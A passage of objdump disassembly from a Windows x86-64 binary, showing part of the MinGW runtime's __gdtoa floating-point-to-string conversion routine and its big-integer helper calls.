   14000764f:	c7 84 24 9c 00 00 00 	movl   $0x0,0x9c(%rsp)
   140007656:	00 00 00 00 
   14000765a:	29 c8                	sub    %ecx,%eax
   14000765c:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140007663:	e9 8d f7 ff ff       	jmp    140006df5 <__gdtoa+0x8a5>
   140007668:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000766f:	00 
   140007670:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140007674:	85 c0                	test   %eax,%eax
   140007676:	0f 85 f4 00 00 00    	jne    140007770 <__gdtoa+0x1220>
   14000767c:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140007680:	31 ed                	xor    %ebp,%ebp
   140007682:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140007689:	e9 d1 f7 ff ff       	jmp    140006e5f <__gdtoa+0x90f>
   14000768e:	45 85 e4             	test   %r12d,%r12d
   140007691:	74 4d                	je     1400076e0 <__gdtoa+0x1190>
   140007693:	48 89 e9             	mov    %rbp,%rcx
   140007696:	44 89 e2             	mov    %r12d,%edx
   140007699:	44 89 9c 24 88 00 00 	mov    %r11d,0x88(%rsp)
   1400076a0:	00 
   1400076a1:	e8 da 0e 00 00       	call   140008580 <__pow5mult_D2A>
   1400076a6:	48 89 f2             	mov    %rsi,%rdx
   1400076a9:	48 89 c1             	mov    %rax,%rcx
   1400076ac:	48 89 c5             	mov    %rax,%rbp
   1400076af:	e8 7c 0d 00 00       	call   140008430 <__mult_D2A>
   1400076b4:	48 89 f1             	mov    %rsi,%rcx
   1400076b7:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400076bc:	e8 7f 0b 00 00       	call   140008240 <__Bfree_D2A>
   1400076c1:	44 29 64 24 68       	sub    %r12d,0x68(%rsp)
   1400076c6:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400076cb:	44 8b 9c 24 88 00 00 	mov    0x88(%rsp),%r11d
   1400076d2:	00 
   1400076d3:	48 89 c6             	mov    %rax,%rsi
   1400076d6:	0f 84 7b f7 ff ff    	je     140006e57 <__gdtoa+0x907>
   1400076dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400076e0:	8b 54 24 68          	mov    0x68(%rsp),%edx
   1400076e4:	48 89 f1             	mov    %rsi,%rcx
   1400076e7:	44 89 5c 24 58       	mov    %r11d,0x58(%rsp)
   1400076ec:	e8 8f 0e 00 00       	call   140008580 <__pow5mult_D2A>
   1400076f1:	c7 44 24 68 01 00 00 	movl   $0x1,0x68(%rsp)
   1400076f8:	00 
   1400076f9:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   1400076fe:	48 89 c6             	mov    %rax,%rsi
   140007701:	e9 59 f7 ff ff       	jmp    140006e5f <__gdtoa+0x90f>
   140007706:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%rsp)
   14000770d:	00 
   14000770e:	c7 84 24 8c 00 00 00 	movl   $0x1,0x8c(%rsp)
   140007715:	01 00 00 00 
   140007719:	e9 69 f2 ff ff       	jmp    140006987 <__gdtoa+0x437>
   14000771e:	8b 7c 24 40          	mov    0x40(%rsp),%edi
   140007722:	31 c9                	xor    %ecx,%ecx
   140007724:	f7 d7                	not    %edi
   140007726:	e8 15 0b 00 00       	call   140008240 <__Bfree_D2A>
   14000772b:	8d 47 01             	lea    0x1(%rdi),%eax
   14000772e:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   140007735:	00 
   140007736:	89 44 24 54          	mov    %eax,0x54(%rsp)
   14000773a:	4c 89 f8             	mov    %r15,%rax
   14000773d:	e9 a5 f8 ff ff       	jmp    140006fe7 <__gdtoa+0xa97>
   140007742:	8b 54 24 40          	mov    0x40(%rsp),%edx
   140007746:	e9 1a fb ff ff       	jmp    140007265 <__gdtoa+0xd15>
   14000774b:	ba 01 00 00 00       	mov    $0x1,%edx
   140007750:	44 89 5c 24 54       	mov    %r11d,0x54(%rsp)
   140007755:	29 c2                	sub    %eax,%edx
   140007757:	c7 44 24 7c 00 00 00 	movl   $0x0,0x7c(%rsp)
   14000775e:	00 
   14000775f:	89 54 24 60          	mov    %edx,0x60(%rsp)
   140007763:	44 89 5c 24 70       	mov    %r11d,0x70(%rsp)
   140007768:	e9 70 f0 ff ff       	jmp    1400067dd <__gdtoa+0x28d>
   14000776d:	0f 1f 00             	nopl   (%rax)
   140007770:	8b 54 24 68          	mov    0x68(%rsp),%edx
   140007774:	48 89 f1             	mov    %rsi,%rcx
   140007777:	44 89 5c 24 58       	mov    %r11d,0x58(%rsp)
   14000777c:	31 ed                	xor    %ebp,%ebp
   14000777e:	e8 fd 0d 00 00       	call   140008580 <__pow5mult_D2A>
   140007783:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%rsp)
   14000778a:	00 
   14000778b:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   140007790:	48 89 c6             	mov    %rax,%rsi
   140007793:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140007797:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   14000779e:	e9 bc f6 ff ff       	jmp    140006e5f <__gdtoa+0x90f>
   1400077a3:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   1400077a7:	44 8b 64 24 48       	mov    0x48(%rsp),%r12d
   1400077ac:	89 d0                	mov    %edx,%eax
   1400077ae:	89 54 24 58          	mov    %edx,0x58(%rsp)
   1400077b2:	44 01 64 24 54       	add    %r12d,0x54(%rsp)
   1400077b7:	29 c8                	sub    %ecx,%eax
   1400077b9:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400077be:	01 44 24 70          	add    %eax,0x70(%rsp)
   1400077c2:	44 89 9c 24 80 00 00 	mov    %r11d,0x80(%rsp)
   1400077c9:	00 
   1400077ca:	44 89 a4 24 9c 00 00 	mov    %r12d,0x9c(%rsp)
   1400077d1:	00 
   1400077d2:	e8 99 0b 00 00       	call   140008370 <__i2b_D2A>
   1400077d7:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   1400077db:	8b 54 24 58          	mov    0x58(%rsp),%edx
   1400077df:	44 8b 9c 24 80 00 00 	mov    0x80(%rsp),%r11d
   1400077e6:	00 
   1400077e7:	48 89 c5             	mov    %rax,%rbp
   1400077ea:	85 c9                	test   %ecx,%ecx
   1400077ec:	0f 85 01 03 00 00    	jne    140007af3 <__gdtoa+0x15a3>
   1400077f2:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   1400077f9:	00 00 00 00 
   1400077fd:	44 89 64 24 60       	mov    %r12d,0x60(%rsp)
   140007802:	89 54 24 68          	mov    %edx,0x68(%rsp)
   140007806:	e9 d5 fe ff ff       	jmp    1400076e0 <__gdtoa+0x1190>
   14000780b:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000780f:	8d 51 fd             	lea    -0x3(%rcx),%edx
   140007812:	83 e2 fd             	and    $0xfffffffd,%edx
   140007815:	0f 84 0b fe ff ff    	je     140007626 <__gdtoa+0x10d6>
   14000781b:	e9 8b f5 ff ff       	jmp    140006dab <__gdtoa+0x85b>
   140007820:	83 44 24 54 01       	addl   $0x1,0x54(%rsp)
   140007825:	41 c6 07 31          	movb   $0x31,(%r15)
   140007829:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   140007830:	00 
   140007831:	e9 8a fb ff ff       	jmp    1400073c0 <__gdtoa+0xe70>
   140007836:	48 89 f1             	mov    %rsi,%rcx
   140007839:	ba 01 00 00 00       	mov    $0x1,%edx
   14000783e:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140007843:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
   140007848:	e8 b3 0e 00 00       	call   140008700 <__lshift_D2A>
   14000784d:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140007852:	48 89 c1             	mov    %rax,%rcx
   140007855:	48 89 c6             	mov    %rax,%rsi
   140007858:	e8 b3 0f 00 00       	call   140008810 <__cmp_D2A>
   14000785d:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   140007862:	85 c0                	test   %eax,%eax
   140007864:	0f 8f 0f fd ff ff    	jg     140007579 <__gdtoa+0x1029>
   14000786a:	75 0f                	jne    14000787b <__gdtoa+0x132b>
   14000786c:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
   140007871:	41 83 e0 01          	and    $0x1,%r8d
   140007875:	0f 85 fe fc ff ff    	jne    140007579 <__gdtoa+0x1029>
   14000787b:	83 7e 14 01          	cmpl   $0x1,0x14(%rsi)
   14000787f:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   140007886:	00 
   140007887:	4c 89 f0             	mov    %r14,%rax
   14000788a:	0f 8f 30 fb ff ff    	jg     1400073c0 <__gdtoa+0xe70>
   140007890:	8b 46 18             	mov    0x18(%rsi),%eax
   140007893:	e9 bb fc ff ff       	jmp    140007553 <__gdtoa+0x1003>
   140007898:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000789f:	00 
   1400078a0:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1400078a4:	01 54 24 54          	add    %edx,0x54(%rsp)
   1400078a8:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   1400078af:	00 
   1400078b0:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
   1400078b5:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   1400078bc:	01 d0                	add    %edx,%eax
   1400078be:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   1400078c5:	00 
   1400078c6:	89 44 24 60          	mov    %eax,0x60(%rsp)
   1400078ca:	c7 44 24 78 ff ff ff 	movl   $0xffffffff,0x78(%rsp)
   1400078d1:	ff 
   1400078d2:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%rsp)
   1400078d9:	ff 
   1400078da:	e9 16 f5 ff ff       	jmp    140006df5 <__gdtoa+0x8a5>
   1400078df:	f2 0f 59 d3          	mulsd  %xmm3,%xmm2
   1400078e3:	66 0f 28 c8          	movapd %xmm0,%xmm1
   1400078e7:	4c 89 f8             	mov    %r15,%rax
   1400078ea:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400078ef:	f2 0f 10 1d 99 3e 00 	movsd  0x3e99(%rip),%xmm3        # 14000b790 <.rdata+0x50>
   1400078f6:	00 
   1400078f7:	45 31 c0             	xor    %r8d,%r8d
   1400078fa:	eb 0e                	jmp    14000790a <__gdtoa+0x13ba>
   1400078fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140007900:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
   140007904:	83 c1 01             	add    $0x1,%ecx
   140007907:	41 89 e8             	mov    %ebp,%r8d
   14000790a:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
   14000790e:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
   140007915:	85 d2                	test   %edx,%edx
   140007917:	74 0f                	je     140007928 <__gdtoa+0x13d8>
   140007919:	66 0f ef e4          	pxor   %xmm4,%xmm4
   14000791d:	41 89 e8             	mov    %ebp,%r8d
   140007920:	f2 0f 2a e2          	cvtsi2sd %edx,%xmm4
   140007924:	f2 0f 5c cc          	subsd  %xmm4,%xmm1
   140007928:	48 83 c0 01          	add    $0x1,%rax
   14000792c:	83 c2 30             	add    $0x30,%edx
   14000792f:	88 50 ff             	mov    %dl,-0x1(%rax)
   140007932:	8b 8c 24 9c 00 00 00 	mov    0x9c(%rsp),%ecx
   140007939:	44 39 d1             	cmp    %r10d,%ecx
   14000793c:	75 c2                	jne    140007900 <__gdtoa+0x13b0>
   14000793e:	45 84 c0             	test   %r8b,%r8b
   140007941:	75 04                	jne    140007947 <__gdtoa+0x13f7>
   140007943:	66 0f 28 c8          	movapd %xmm0,%xmm1
   140007947:	f2 0f 10 05 71 3e 00 	movsd  0x3e71(%rip),%xmm0        # 14000b7c0 <.rdata+0x80>
   14000794e:	00 
   14000794f:	66 0f 28 da          	movapd %xmm2,%xmm3
   140007953:	f2 0f 58 d8          	addsd  %xmm0,%xmm3
   140007957:	66 0f 2f cb          	comisd %xmm3,%xmm1
   14000795b:	0f 87 5f f3 ff ff    	ja     140006cc0 <__gdtoa+0x770>
   140007961:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   140007965:	66 0f 2f c1          	comisd %xmm1,%xmm0
   140007969:	0f 87 54 04 00 00    	ja     140007dc3 <__gdtoa+0x1873>
   14000796f:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007973:	85 c0                	test   %eax,%eax
   140007975:	0f 88 03 04 00 00    	js     140007d7e <__gdtoa+0x182e>
   14000797b:	41 8b 45 14          	mov    0x14(%r13),%eax
   14000797f:	85 c0                	test   %eax,%eax
   140007981:	0f 88 f7 03 00 00    	js     140007d7e <__gdtoa+0x182e>
   140007987:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   14000798e:	00 
   14000798f:	f2 41 0f 10 11       	movsd  (%r9),%xmm2
   140007994:	e9 37 f2 ff ff       	jmp    140006bd0 <__gdtoa+0x680>
   140007999:	44 8b 5c 24 64       	mov    0x64(%rsp),%r11d
   14000799e:	41 89 d8             	mov    %ebx,%r8d
   1400079a1:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   1400079a6:	49 89 fa             	mov    %rdi,%r10
   1400079a9:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   1400079ae:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400079b3:	45 85 db             	test   %r11d,%r11d
   1400079b6:	0f 84 16 02 00 00    	je     140007bd2 <__gdtoa+0x1682>
   1400079bc:	83 7e 14 01          	cmpl   $0x1,0x14(%rsi)
   1400079c0:	0f 8e 43 04 00 00    	jle    140007e09 <__gdtoa+0x18b9>
   1400079c6:	83 7c 24 64 02       	cmpl   $0x2,0x64(%rsp)
   1400079cb:	0f 84 68 02 00 00    	je     140007c39 <__gdtoa+0x16e9>
   1400079d1:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400079d6:	45 89 c6             	mov    %r8d,%r14d
   1400079d9:	4d 89 d4             	mov    %r10,%r12
   1400079dc:	4c 89 cb             	mov    %r9,%rbx
   1400079df:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400079e4:	eb 50                	jmp    140007a36 <__gdtoa+0x14e6>
   1400079e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400079ed:	00 00 00 
   1400079f0:	45 88 77 ff          	mov    %r14b,-0x1(%r15)
   1400079f4:	45 31 c0             	xor    %r8d,%r8d
   1400079f7:	4c 89 e9             	mov    %r13,%rcx
   1400079fa:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400079ff:	4d 89 fc             	mov    %r15,%r12
   140007a02:	e8 a9 08 00 00       	call   1400082b0 <__multadd_D2A>
   140007a07:	4c 39 ed             	cmp    %r13,%rbp
   140007a0a:	48 89 f1             	mov    %rsi,%rcx
   140007a0d:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007a12:	48 0f 44 e8          	cmove  %rax,%rbp
   140007a16:	45 31 c0             	xor    %r8d,%r8d
   140007a19:	48 89 c7             	mov    %rax,%rdi
   140007a1c:	e8 8f 08 00 00       	call   1400082b0 <__multadd_D2A>
   140007a21:	48 89 da             	mov    %rbx,%rdx
   140007a24:	49 89 fd             	mov    %rdi,%r13
   140007a27:	48 89 c1             	mov    %rax,%rcx
   140007a2a:	48 89 c6             	mov    %rax,%rsi
   140007a2d:	e8 9e e9 ff ff       	call   1400063d0 <__quorem_D2A>
   140007a32:	44 8d 70 30          	lea    0x30(%rax),%r14d
   140007a36:	4c 89 ea             	mov    %r13,%rdx
   140007a39:	48 89 d9             	mov    %rbx,%rcx
   140007a3c:	4d 8d 7c 24 01       	lea    0x1(%r12),%r15
   140007a41:	e8 ca 0d 00 00       	call   140008810 <__cmp_D2A>
   140007a46:	85 c0                	test   %eax,%eax
   140007a48:	7f a6                	jg     1400079f0 <__gdtoa+0x14a0>
   140007a4a:	4d 89 e2             	mov    %r12,%r10
   140007a4d:	49 89 d9             	mov    %rbx,%r9
   140007a50:	4d 89 fc             	mov    %r15,%r12
   140007a53:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140007a58:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140007a5d:	45 89 f0             	mov    %r14d,%r8d
   140007a60:	41 83 fe 39          	cmp    $0x39,%r14d
   140007a64:	0f 84 02 03 00 00    	je     140007d6c <__gdtoa+0x181c>
   140007a6a:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   140007a71:	00 
   140007a72:	48 89 ef             	mov    %rbp,%rdi
   140007a75:	41 83 c0 01          	add    $0x1,%r8d
   140007a79:	4c 89 ed             	mov    %r13,%rbp
   140007a7c:	45 88 02             	mov    %r8b,(%r10)
   140007a7f:	4c 89 e0             	mov    %r12,%rax
   140007a82:	e9 39 f9 ff ff       	jmp    1400073c0 <__gdtoa+0xe70>
   140007a87:	41 8b 45 04          	mov    0x4(%r13),%eax
   140007a8b:	83 c0 01             	add    $0x1,%eax
   140007a8e:	39 44 24 38          	cmp    %eax,0x38(%rsp)
   140007a92:	0f 8e 08 f4 ff ff    	jle    140006ea0 <__gdtoa+0x950>
   140007a98:	83 44 24 60 01       	addl   $0x1,0x60(%rsp)
   140007a9d:	83 44 24 54 01       	addl   $0x1,0x54(%rsp)
   140007aa2:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140007aa9:	00 
   140007aaa:	e9 f1 f3 ff ff       	jmp    140006ea0 <__gdtoa+0x950>
   140007aaf:	90                   	nop
   140007ab0:	8b 4d 08             	mov    0x8(%rbp),%ecx
   140007ab3:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
   140007ab8:	e8 93 06 00 00       	call   140008150 <__Balloc_D2A>
   140007abd:	48 8d 55 10          	lea    0x10(%rbp),%rdx
   140007ac1:	48 8d 48 10          	lea    0x10(%rax),%rcx
   140007ac5:	49 89 c4             	mov    %rax,%r12
   140007ac8:	48 63 45 14          	movslq 0x14(%rbp),%rax
   140007acc:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
   140007ad3:	00 
   140007ad4:	e8 ff 18 00 00       	call   1400093d8 <memcpy>
   140007ad9:	ba 01 00 00 00       	mov    $0x1,%edx
   140007ade:	4c 89 e1             	mov    %r12,%rcx
   140007ae1:	e8 1a 0c 00 00       	call   140008700 <__lshift_D2A>
   140007ae6:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140007aeb:	49 89 c5             	mov    %rax,%r13
   140007aee:	e9 33 f7 ff ff       	jmp    140007226 <__gdtoa+0xcd6>
   140007af3:	44 8b 54 24 60       	mov    0x60(%rsp),%r10d
   140007af8:	44 8b 44 24 54       	mov    0x54(%rsp),%r8d
   140007afd:	89 54 24 68          	mov    %edx,0x68(%rsp)
   140007b01:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   140007b06:	45 39 c2             	cmp    %r8d,%r10d
   140007b09:	44 89 c0             	mov    %r8d,%eax
   140007b0c:	41 0f 4e c2          	cmovle %r10d,%eax
   140007b10:	43 8d 0c 11          	lea    (%r9,%r10,1),%ecx
   140007b14:	41 29 c0             	sub    %eax,%r8d
   140007b17:	41 29 c2             	sub    %eax,%r10d
   140007b1a:	29 c1                	sub    %eax,%ecx
   140007b1c:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140007b23:	44 89 94 24 80 00 00 	mov    %r10d,0x80(%rsp)
   140007b2a:	00 
   140007b2b:	44 89 44 24 54       	mov    %r8d,0x54(%rsp)
   140007b30:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   140007b34:	e9 a7 fb ff ff       	jmp    1400076e0 <__gdtoa+0x1190>
   140007b39:	41 c6 07 31          	movb   $0x31,(%r15)
   140007b3d:	49 8d 47 01          	lea    0x1(%r15),%rax
   140007b41:	31 c9                	xor    %ecx,%ecx
   140007b43:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140007b48:	e8 f3 06 00 00       	call   140008240 <__Bfree_D2A>
   140007b4d:	c7 44 24 54 02 00 00 	movl   $0x2,0x54(%rsp)
   140007b54:	00 
   140007b55:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007b5a:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   140007b61:	00 
   140007b62:	e9 67 f4 ff ff       	jmp    140006fce <__gdtoa+0xa7e>
   140007b67:	41 89 d8             	mov    %ebx,%r8d
   140007b6a:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140007b6f:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   140007b74:	49 89 fa             	mov    %rdi,%r10
   140007b77:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140007b7c:	41 83 f8 39          	cmp    $0x39,%r8d
   140007b80:	0f 84 e6 01 00 00    	je     140007d6c <__gdtoa+0x181c>
   140007b86:	41 83 c0 01          	add    $0x1,%r8d
   140007b8a:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   140007b91:	00 
   140007b92:	4c 89 e0             	mov    %r12,%rax
   140007b95:	44 88 07             	mov    %r8b,(%rdi)
   140007b98:	48 89 ef             	mov    %rbp,%rdi
   140007b9b:	4c 89 ed             	mov    %r13,%rbp
   140007b9e:	e9 1d f8 ff ff       	jmp    1400073c0 <__gdtoa+0xe70>
   140007ba3:	41 89 d8             	mov    %ebx,%r8d
   140007ba6:	48 89 ef             	mov    %rbp,%rdi
   140007ba9:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140007bae:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   140007bb3:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140007bb8:	4c 89 ed             	mov    %r13,%rbp
   140007bbb:	e9 71 f9 ff ff       	jmp    140007531 <__gdtoa+0xfe1>
   140007bc0:	41 c6 07 30          	movb   $0x30,(%r15)
   140007bc4:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   140007bc8:	83 44 24 64 01       	addl   $0x1,0x64(%rsp)
   140007bcd:	e9 f7 f0 ff ff       	jmp    140006cc9 <__gdtoa+0x779>
   140007bd2:	85 d2                	test   %edx,%edx
   140007bd4:	7e 59                	jle    140007c2f <__gdtoa+0x16df>
   140007bd6:	48 89 f1             	mov    %rsi,%rcx
   140007bd9:	ba 01 00 00 00       	mov    $0x1,%edx
   140007bde:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140007be3:	4c 89 54 24 40       	mov    %r10,0x40(%rsp)
   140007be8:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
   140007bed:	e8 0e 0b 00 00       	call   140008700 <__lshift_D2A>
   140007bf2:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140007bf7:	48 89 c1             	mov    %rax,%rcx
   140007bfa:	48 89 c6             	mov    %rax,%rsi
   140007bfd:	e8 0e 0c 00 00       	call   140008810 <__cmp_D2A>
   140007c02:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   140007c07:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
   140007c0c:	85 c0                	test   %eax,%eax
   140007c0e:	4c 8b 54 24 40       	mov    0x40(%rsp),%r10
   140007c13:	0f 8e 53 02 00 00    	jle    140007e6c <__gdtoa+0x191c>
   140007c19:	41 83 f8 39          	cmp    $0x39,%r8d
   140007c1d:	0f 84 62 02 00 00    	je     140007e85 <__gdtoa+0x1935>
   140007c23:	c7 44 24 64 20 00 00 	movl   $0x20,0x64(%rsp)
   140007c2a:	00 
   140007c2b:	45 8d 46 31          	lea    0x31(%r14),%r8d
   140007c2f:	83 7e 14 01          	cmpl   $0x1,0x14(%rsi)
   140007c33:	0f 8e f2 01 00 00    	jle    140007e2b <__gdtoa+0x18db>
   140007c39:	48 89 ef             	mov    %rbp,%rdi
   140007c3c:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   140007c43:	00 
   140007c44:	4c 89 ed             	mov    %r13,%rbp
   140007c47:	4d 8d 62 01          	lea    0x1(%r10),%r12
   140007c4b:	e9 2c fe ff ff       	jmp    140007a7c <__gdtoa+0x152c>
   140007c50:	41 8b 45 04          	mov    0x4(%r13),%eax
   140007c54:	83 c0 01             	add    $0x1,%eax
   140007c57:	39 44 24 38          	cmp    %eax,0x38(%rsp)
   140007c5b:	0f 8e 5c f9 ff ff    	jle    1400075bd <__gdtoa+0x106d>
   140007c61:	83 44 24 60 01       	addl   $0x1,0x60(%rsp)
   140007c66:	83 44 24 54 01       	addl   $0x1,0x54(%rsp)
   140007c6b:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140007c72:	00 
   140007c73:	e9 4d f9 ff ff       	jmp    1400075c5 <__gdtoa+0x1075>
   140007c78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140007c7f:	00 
   140007c80:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140007c84:	45 89 f3             	mov    %r14d,%r11d
   140007c87:	89 44 24 48          	mov    %eax,0x48(%rsp)
   140007c8b:	e9 b0 f2 ff ff       	jmp    140006f40 <__gdtoa+0x9f0>
   140007c90:	44 8b 54 24 78       	mov    0x78(%rsp),%r10d
   140007c95:	45 85 d2             	test   %r10d,%r10d
   140007c98:	0f 8e dd f3 ff ff    	jle    14000707b <__gdtoa+0xb2b>
   140007c9e:	f2 0f 59 05 ea 3a 00 	mulsd  0x3aea(%rip),%xmm0        # 14000b790 <.rdata+0x50>
   140007ca5:	00 
   140007ca6:	f2 0f 10 0d ea 3a 00 	movsd  0x3aea(%rip),%xmm1        # 14000b798 <.rdata+0x58>
   140007cad:	00 
   140007cae:	c7 44 24 64 ff ff ff 	movl   $0xffffffff,0x64(%rsp)
   140007cb5:	ff 
   140007cb6:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   140007cba:	f2 0f 58 0d c6 3a 00 	addsd  0x3ac6(%rip),%xmm1        # 14000b788 <.rdata+0x48>
   140007cc1:	00 
   140007cc2:	66 48 0f 7e c8       	movq   %xmm1,%rax
   140007cc7:	48 89 c2             	mov    %rax,%rdx
   140007cca:	89 c0                	mov    %eax,%eax
   140007ccc:	48 c1 ea 20          	shr    $0x20,%rdx
   140007cd0:	81 ea 00 00 40 03    	sub    $0x3400000,%edx
   140007cd6:	48 c1 e2 20          	shl    $0x20,%rdx
   140007cda:	48 09 d0             	or     %rdx,%rax
   140007cdd:	e9 a7 ed ff ff       	jmp    140006a89 <__gdtoa+0x539>
   140007ce2:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
   140007ce6:	66 0f 2f c2          	comisd %xmm2,%xmm0
   140007cea:	0f 87 ac ef ff ff    	ja     140006c9c <__gdtoa+0x74c>
   140007cf0:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
   140007cf4:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   140007cfb:	00 
   140007cfc:	0f 8a cc f2 ff ff    	jp     140006fce <__gdtoa+0xa7e>
   140007d02:	0f 85 c6 f2 ff ff    	jne    140006fce <__gdtoa+0xa7e>
   140007d08:	80 e2 01             	and    $0x1,%dl
   140007d0b:	0f 84 bd f2 ff ff    	je     140006fce <__gdtoa+0xa7e>
   140007d11:	e9 86 ef ff ff       	jmp    140006c9c <__gdtoa+0x74c>
   140007d16:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140007d1a:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   140007d1e:	0f 9a c2             	setp   %dl
   140007d21:	b9 01 00 00 00       	mov    $0x1,%ecx
   140007d26:	8b 7c 24 64          	mov    0x64(%rsp),%edi
   140007d2a:	0f b6 d2             	movzbl %dl,%edx
   140007d2d:	0f 45 d1             	cmovne %ecx,%edx
   140007d30:	83 c7 01             	add    $0x1,%edi
   140007d33:	89 7c 24 54          	mov    %edi,0x54(%rsp)
   140007d37:	c1 e2 04             	shl    $0x4,%edx
   140007d3a:	89 54 24 50          	mov    %edx,0x50(%rsp)
   140007d3e:	e9 8b f2 ff ff       	jmp    140006fce <__gdtoa+0xa7e>
   140007d43:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007d47:	85 c0                	test   %eax,%eax
   140007d49:	0f 88 b3 f8 ff ff    	js     140007602 <__gdtoa+0x10b2>
   140007d4f:	41 8b 6d 14          	mov    0x14(%r13),%ebp
   140007d53:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140007d5a:	00 
   140007d5b:	85 ed                	test   %ebp,%ebp
   140007d5d:	0f 89 44 f3 ff ff    	jns    1400070a7 <__gdtoa+0xb57>
   140007d63:	e9 a8 f8 ff ff       	jmp    140007610 <__gdtoa+0x10c0>
   140007d68:	4c 8d 67 01          	lea    0x1(%rdi),%r12
   140007d6c:	48 89 ef             	mov    %rbp,%rdi
   140007d6f:	4c 89 ed             	mov    %r13,%rbp
   140007d72:	41 c6 02 39          	movb   $0x39,(%r10)
   140007d76:	4d 89 e6             	mov    %r12,%r14
   140007d79:	e9 fb f7 ff ff       	jmp    140007579 <__gdtoa+0x1029>
   140007d7e:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140007d85:	00 
   140007d86:	e9 a6 f3 ff ff       	jmp    140007131 <__gdtoa+0xbe1>
   140007d8b:	45 31 c0             	xor    %r8d,%r8d
   140007d8e:	48 89 e9             	mov    %rbp,%rcx
   140007d91:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007d96:	e8 15 05 00 00       	call   1400082b0 <__multadd_D2A>
   140007d9b:	45 84 ed             	test   %r13b,%r13b
